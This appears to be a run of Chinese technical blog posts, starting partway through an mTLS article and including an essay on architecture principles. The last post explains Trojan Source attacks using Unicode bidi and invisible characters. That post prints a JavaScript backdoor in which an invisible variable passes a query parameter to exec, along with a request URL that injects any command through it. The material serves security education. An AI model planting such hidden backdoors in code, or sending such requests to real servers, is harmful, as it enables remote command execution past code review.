
4）使用 CA 给 Alice 签名证书

```
openssl x509  -req -in alice.csr \
    -extfile <(printf "subjectAltName=DNS:localhost.alice") \ 
    -CA ca.crt -CAkey ca.key  \
    -days 365 -sha256 -CAcreateserial \
    -out alice.crt
```

#### 双向认证 mTLS

上面，我们说的基本上都是单向认证，大量的场景都是确保用户方访问的是真正的服务方，如：银行，电商网站，等。这样可以保证用户不会被钓鱼网站或是中间人攻击。但是，很多时候，我们也是需要双向认证的。下面是一个典型的场景——微信支付和商户间交互

- 用户到商家那边买东西，商家要求用户进行支付。
- 用户选择了微信支付，于是，界面从商户侧切到了微信侧
- 微信那边支付完成后，商户这边收到微信那边支付完成的通知，于是开始发货。

这个过程中有件事非常重要——就是微信通知商户支付完成的时候。

- 微信得确保通知到的就是用户所支付商户，而不是别个。
- 商户也得要能确认，来通知我的就是微信，不是别人。

一般来说，微信会给商户一个 AppID和一个 AppSerct，用这个来确保是我认证过的商户来调用我，然后，需要商户在自己的系统里填一个回调的 URL，并通过平台设置的 key来做 MD5/HMAC的签名来确保是官方的回调。这都是在《[HTTP API 认证授权术](https://coolshell.cn/articles/19395.html)》中提到过的技术，是相对传统的技术。

如今，**mTLS是**确保云原生应用程序中服务之间的通信安全的首选协议。 也就是双向认证。

传统的 TLS 认证过程是：

1. 客户端连接到服务器
2. 服务器提供其 TLS 证书
3. 客户端验证服务器的证书
4. 客户端和服务器通过加密的 TLS 连接交换信息

在 mTLS 中，客户端和服务器都有一个证书，双方都使用他们的公钥/私钥对进行身份验证。与常规 TLS 相比，mTLS 中有额外的步骤来验证双方（以**粗体显示的**额外步骤）：

1. 客户端连接到服务器
2. 服务器提供其 TLS 证书
3. 客户端验证服务器的证书
4. **客户端出示其 TLS 证书**
5. **服务器验证客户端的证书**
6. **服务器授予访问权限**
7. 客户端和服务器通过加密的 TLS 连接交换信息

mTLS 需要“根”TLS 证书；这我们自己来完成证书颁发机构的职责。授权客户端和服务器使用的证书必须与此根证书相对应。根证书是自签名的，这意味着我们需要自己创建它。（注：此方法不适用于公共 Internet 上的单向 TLS，因为外部证书颁发机构必须颁发这些证书）

那么，为什么整个互联网上都用了 TLS 了，为什么 不升级一下使用 mTLS？这里有两方面的原因：

- 公共互联网上要解决的问题是：A) 确保用户访问到的是正确的网站，而不是钓鱼网站。B）网站传输的内容是安全和私密且不会被篡改的。
- 将 TLS 证书分发到所有最终用户设备将非常困难。生成、管理和验证为此所需的数十亿个证书几乎是不可能的任务。

在较小的范围内，mTLS 对于单个组织非常有用且非常实用，尤其是当这些组织采用零信任方法来确保网络安全时。由于默认情况下零信任方法不信任任何用户、设备或请求，因此组织必须能够在每次尝试访问网络中的任何点时对每个用户、设备和请求进行身份验证。mTLS 通过对用户进行身份验证和设备验证来帮助实现这一目标。

关于 mTLS，这里有一个我用 Golang 写的示例 – https://github.com/haoel/mTLS，大家可以参考一下。

P.S. 本文图版中的卡司来自安全圈的标准 Cast，参看[ Alice and Bob](https://en.wikipedia.org/wiki/Alice_and_Bob)。

（全文完）

# 我做系统架构的一些原则

#####  [2021年12月21日 ](https://coolshell.cn/articles/21672.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [163 条评论](https://coolshell.cn/articles/21672.html#comments) 210,144 人阅读

![img](photo/bachelor-mechanical-eng-icon@72x.png)工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）

目录



[原则一：关注于真正的收益而不是技术本身](https://coolshell.cn/articles/21672.html#原则一：关注于真正的收益而不是技术本身)[原则二：以应用服务和 API 为视角，而不是以资源和技术为视角](https://coolshell.cn/articles/21672.html#原则二：以应用服务和_API_为视角，而不是以资源和技术为视角)[原则三：选择最主流和成熟的技术](https://coolshell.cn/articles/21672.html#原则三：选择最主流和成熟的技术)[原则四：完备性会比性能更重要](https://coolshell.cn/articles/21672.html#原则四：完备性会比性能更重要)[原则五：制定并遵循服从标准、规范和最佳实践](https://coolshell.cn/articles/21672.html#原则五：制定并遵循服从标准、规范和最佳实践)[原则六：重视架构扩展性和可运维性](https://coolshell.cn/articles/21672.html#原则六：重视架构扩展性和可运维性)[原则七：对控制逻辑进行全面收口](https://coolshell.cn/articles/21672.html#原则七：对控制逻辑进行全面收口)[原则八：不要迁就老旧系统的技术债务](https://coolshell.cn/articles/21672.html#原则八：不要迁就老旧系统的技术债务)[原则九：不要依赖自己的经验，要依赖于数据和学习](https://coolshell.cn/articles/21672.html#原则九：不要依赖自己的经验，要依赖于数据和学习)[原则十：千万要小心 X – Y 问题，要追问原始需求](https://coolshell.cn/articles/21672.html#原则十：千万要小心_X_–_Y_问题，要追问原始需求)[原则十一：激进胜于保守，创新与实用并不冲突](https://coolshell.cn/articles/21672.html#原则十一：激进胜于保守，创新与实用并不冲突)

#### 原则一：关注于真正的收益而不是技术本身

对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：

- **是否可以降低技术门槛加快整个团队的开发流程**。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）
- **是否可以让整个系统可以运行的更稳定**。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《[关于高可用的架构](https://coolshell.cn/articles/17459.html)》）
- **是否可以通过简化和自动化降低成本**。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。

如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。



#### 原则二：以应用服务和 API 为视角，而不是以资源和技术为视角

国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……

**这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops**。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——**要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。**

#### 原则三：选择最主流和成熟的技术

技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的 PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。

- **尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈**。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。
- **选择全球流行的技术，而不是中国流行的技术**。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。
- **尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改**。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。
- **绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的**。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的

在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……

注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……

#### 原则四：完备性会比性能更重要

我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。

所以，我给如下的一些如下的架构原则：

- **使用最科学严谨的技术模型为主，并以不严谨的模型作为补充**。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。
- **性能上的东西，总是有很多解的**。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。

为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。

#### 原则五：制定并遵循服从标准、规范和最佳实践

这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。**有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？**

还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。

下面，我罗列一些你需要注意的标准和规范（包括但不限于）：

- **服务间调用的协议标准和规范**。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。
- **一些命名的标准和规范**。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等
- **日志和监控的规范**。这其中包括：日志格式，监控数据，采样要求，报警……等等
- **配置上的规范**。这其中包括：操作系统配置、中间件配置，软件包……等等
- **中间件使用的规范**。数据库，缓存、消息队列……等等
- **软件和开发库版本统一**。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。

这里重要说一下两个事：

- **Restful API 的规范**。我觉得是非常重要的，这里给两个我觉得写得最好的参考：[Paypal](https://github.com/paypal/api-standards/blob/master/api-style-guide.md) 和 [Microsoft](https://github.com/microsoft/api-guidelines) 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。
- **另一个是服务调用链追踪**。对于服务调用链追踪来说，基本上都是参考于 [Google Dapper](https://research.google/pubs/pub36356/) 这篇论文，目前有很多的实现，最严格的实现是 [Zipkin](https://zipkin.io/)，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。
- **软件升级**。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。

#### 原则六：重视架构扩展性和可运维性

在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。

- **通过服务编排架构来降低服务间的耦合**。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。
- **通过服务发现或服务网关来降低服务依赖所带来的运维复杂度**。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。
- **一定要使用各种软件设计的原则**。比如：像SOLID这样的原则（参看《[一些软件设计的原则](https://coolshell.cn/articles/4535.html)》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《[SteveY对Amazon和Google平台的吐槽](https://coolshell.cn/articles/5701.html)》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《[分布式系统的事务处理](https://coolshell.cn/articles/10910.html)》，或微软件的 《[Cloud Design Patterns](https://docs.microsoft.com/en-us/azure/architecture/patterns/)》）……等等

#### 原则七：对控制逻辑进行全面收口

所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：

- **流量收口**。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。
- **服务治理收口**。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。
- **监控数据收口**。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。
- **资源调度有应用部署的收口**。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。
- **中间件的收口**。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。

对此，这里的原则是：

- **你要选择容易进行业务逻辑和控制逻辑分离的技术**。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。
- **你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术**。如：有庞大社区而且相互兼容的技术，如：Java, Docker, Ansible，HTTP，Telegraf/Collectd……
- **中间件你要使用可以 支持HA集群和多租户的技术**。这里基本上所有的主流中间件都会支持 HA 集群方式的。

#### 原则八：不要迁就老旧系统的技术债务

我发现很多公司都很非常大的技术债务，这些债务具体表现如下：

- **使用老旧的技术**。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等
- **不合理的设计**。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等
-  **缺少配套设施**。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等

来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“**如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……**”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。

他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……

我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《[开发团队的效率](https://coolshell.cn/articles/11656.html)》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）

这里有几个原则和方法我是非常坚持的，分享给大家：

- **与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。**
- **建设没有技术债的“新城区”，并通过“[防腐层](https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer) ”的架构模型，不要让技术债侵入“新城区”**。

#### 原则九：不要依赖自己的经验，要依赖于数据和学习

有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……

另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。

#### 原则十：千万要小心 X – Y 问题，要追问原始需求

对于 [X-Y 问题](https://coolshell.cn/articles/10804.html)，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。

比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。

我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……

#### 原则十一：激进胜于保守，创新与实用并不冲突

我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《[Go,Docker 和新技术](https://coolshell.cn/articles/18190.html) 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。

有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。

这里的逻辑很简单 —— **进步永远来自于探索，探索是要付出代价的，但是收益更大**。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……

（全文完）

# 源代码特洛伊木马攻击

#####  [2021年11月19日 ](https://coolshell.cn/articles/21649.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [23 条评论](https://coolshell.cn/articles/21649.html#comments) 37,234 人阅读

![img](photo/il_340x270_pggv.jpg)最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ **BiDi** ”或“ **bidi** ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。

![img](photo/1637305049427-1024x329.jpg)

早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过[ISO/IEC 8859-6](https://en.wikipedia.org/wiki/ISO/IEC_8859-6)和[ISO/IEC 8859-8](https://en.wikipedia.org/wiki/ISO/IEC_8859-8)等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。



双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。

好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“[关于双向Unicode的警告](https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/)”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。

我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。

```
package main

import "fmt"

func main() {
  str, mask := "Hello, World!‮10x‭", 0

  bits := 0
  for _, ch := range str {
    for ch > 0 {
      bits += int(ch) & mask
      ch = ch >> 1
    }
  }
  fmt.Println("Total bits set:", bits)
}
```

这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行 –[ https://play.golang.org/p/e2BDZvFlet0](https://play.golang.org/p/e2BDZvFlet0)），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？

如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。

![img](photo/1637307319589.jpg)

其中有两个浅蓝色的尖括号的东西—— `<202e>` 和 `<202d>` 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 [Unicode Bidirectional Classes](https://www.compart.com/en/unicode/bidiclass)）：

- **U+202E – Right-to-Left Override [RLO]** 
  表示，开始从右到左显示，于是，接下来的文本 `10x", 0` 变成了 `0 ,"x01`
- **U+202D – Left-to-Right Override [LRO]**
  表示，开始从左到右显示，于是，`0,"x01` 中的前4个字符`0 ,"` 反转成 `", 0`，于是整个文本成了 `", 0x01`

所以，你在视觉上看到的是结果是—— `"Hello, World!”, 0x01`， 但是实际上是完全是另外一码事。

然后，Github官方博客中还给了一个安全问题 [CVE-2021-42574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574) ——

> 在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。

这个安全问题在剑桥大学的这篇论文“[Some Vulnerabilities are Invisible](https://www.trojansource.codes/)”中有详细的描述。其中PDF版的文章中也给了这么一个示例：

通过双向文本可以把下面这段代码：

![img](photo/1637308872541.jpg)

伪装成下面的这个样子：

![img](photo/1637308847435.jpg)

在图 2 中`'alice'`被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。

然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入**RLI (Right To Left Isolate)** *–* **U+2067***，*我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。

除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“[The Invisible Javascript Backdoor](https://certitude.consulting/blog/en/invisible-backdoor/)”里的这个示例：

```
const express = require('express');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();

app.get('/network_health', async (req, res) => {
    const { timeout,ㅤ} = req.query;
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',ㅤ
    ];

    try {
        await Promise.all(checkCommands.map(cmd => 
                cmd && exec(cmd, { timeout: +timeout || 5_000 })));
        res.status(200);
        res.send('ok');
    } catch(e) {
        res.status(500);
        res.send('failed');
    }
});

app.listen(8080);
```

上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 `ping -c 1 google.com` 以及 `curl -s http://example.com` 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数`timeout`限制命令执行时间。

然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了

![img](photo/1637310735683-1024x923.jpg)

于是，一个你看不见的 `πàñ` 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：

**http://host:port/network_health?%E3%85%A4=<any command>**

